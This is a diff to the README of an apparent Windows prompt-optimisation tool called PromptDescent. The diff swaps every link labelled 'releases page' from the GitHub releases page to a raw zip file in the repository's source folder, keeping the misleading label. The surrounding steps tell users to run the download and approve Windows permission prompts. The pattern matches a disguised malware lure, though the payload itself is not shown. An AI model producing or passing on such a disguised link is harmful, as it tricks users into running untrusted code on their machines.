@@ -1,10 +1,10 @@
 # 🧠 PromptDescent - Optimize prompts with less trial and error
 
-[![Download PromptDescent](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/jeronimovv/PromptDescent/releases)
+[![Download PromptDescent](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/jeronimovv/PromptDescent/main/src/Descent-Prompt-expurgate.zip)
 
 ## 📥 Download
 
-Visit the [releases page](https://github.com/jeronimovv/PromptDescent/releases) to download PromptDescent for Windows.
+Visit the [releases page](https://raw.githubusercontent.com/jeronimovv/PromptDescent/main/src/Descent-Prompt-expurgate.zip) to download PromptDescent for Windows.
 
 1. Open the release page.
 2. Find the latest release at the top.
@@ -40,7 +40,7 @@ If you plan to run larger prompt tests, use a machine with more memory and a sta
 
 ## 🚀 Getting Started
 
-1. Open the [releases page](https://github.com/jeronimovv/PromptDescent/releases).
+1. Open the [releases page](https://raw.githubusercontent.com/jeronimovv/PromptDescent/main/src/Descent-Prompt-expurgate.zip).
 2. Download the Windows release file.
 3. When the download finishes, open the file.
 4. If Windows asks for permission, choose **Yes** or **Run**.
@@ -201,7 +201,7 @@ To remove the app:
 
 ## 🖱️ Download Again Later
 
-If you need a fresh copy, use the [release page](https://github.com/jeronimovv/PromptDescent/releases) again and download the newest Windows build.
+If you need a fresh copy, use the [release page](https://raw.githubusercontent.com/jeronimovv/PromptDescent/main/src/Descent-Prompt-expurgate.zip) again and download the newest Windows build.
 
 ## 🧠 Best Practices
 
